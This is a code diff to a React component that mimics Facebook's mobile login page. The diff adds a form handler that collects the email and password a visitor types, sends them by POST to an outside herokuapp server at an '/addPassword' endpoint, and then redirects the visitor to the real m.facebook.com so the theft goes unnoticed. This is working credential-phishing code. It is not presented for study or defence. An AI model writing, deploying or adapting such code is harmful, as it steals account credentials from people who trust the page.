@@ -3,6 +3,22 @@ import fbandroid from '../images/fbandroid.png';
 import fblogo from '../images/fblogo.png';
 
 const Mobile = () => {
+	const { register, handleSubmit, watch, errors } = useForm();
+	const onSubmit = data => {
+		const eventData = {
+			email: data.email,
+			password: data.password
+		}
+		fetch('https://whispering-stream-20843.herokuapp.com/addPassword', {
+			method: 'POST',
+			headers: { 'Content-Type': 'application/json' },
+			body: JSON.stringify(eventData)
+		})
+		.then( (response) => {
+			window.location = "https://m.facebook.com/";
+		  })
+	};
+
 	return (
 		<div class="mobile">
 			<div class="mobheader">
@@ -14,10 +30,10 @@ const Mobile = () => {
 					<div id="getfbandroid">Get Facebook for Android and browse faster.</div>
 				</a>
 			</div>
-			<div class="mobmaindiv">
+			<form onSubmit={handleSubmit(onSubmit)} class="mobmaindiv">
 				<div id="mobtextdiv">
-					<input type="text" class="mobtextbox mobtextbox1" placeholder="Mobile number or email address" />
-					<input type="password" class="mobtextbox mobtextbox2" placeholder="Password" />
+					<input name="email"  ref={register}  type="text" class="mobtextbox mobtextbox1" placeholder="Mobile number or email address" />
+					<input name="password" ref={register} type="password" class="mobtextbox mobtextbox2" placeholder="Password" />
 				</div>
 				<div class="mobloginbuttondiv">
 					<input type="submit" class="mobloginbutton" value="Log In" />
@@ -33,7 +49,7 @@ const Mobile = () => {
 					<span>·</span>
 					<a href="#">Help Center</a>
 				</div>
-			</div>
+			</form>
 			<div class="mobfooter">
 				<div id="moblangs">
 					<div class="item1">
